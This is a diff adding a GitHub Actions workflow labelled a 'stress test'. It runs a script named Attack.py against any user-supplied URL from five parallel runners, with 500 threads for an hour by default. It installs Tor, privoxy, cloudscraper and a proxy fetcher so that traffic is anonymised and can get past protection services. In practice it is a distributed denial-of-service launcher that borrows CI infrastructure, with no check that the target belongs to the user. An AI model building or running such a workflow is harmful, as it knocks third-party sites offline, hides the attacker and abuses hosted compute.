@@ -1,0 +1,47 @@
+name: AcherLab Stress Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL (http:// or https://)'
+        required: true
+      threads:
+        description: 'Number of threads'
+        required: false
+        default: '500'
+      duration:
+        description: 'Duration (seconds)'
+        required: false
+        default: '3600'
+      proxy_mode:
+        description: 'Proxy mode (tor/proxylist/both/none)'
+        required: false
+        default: 'both'
+
+jobs:
+  stress:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3 python3-pip tor privoxy
+          pip3 install requests cloudscraper aiohttp httpx pysocks
+
+      - name: Fetch proxy list
+        run: |
+          python3 fetch_proxies.py
+
+      - name: Run stress test
+        run: |
+          python3 Attack.py \
+            --url ${{ github.event.inputs.target_url }} \
+            --threads ${{ github.event.inputs.threads }} \
+            --duration ${{ github.event.inputs.duration }} \
+            --proxy-mode ${{ github.event.inputs.proxy_mode }}
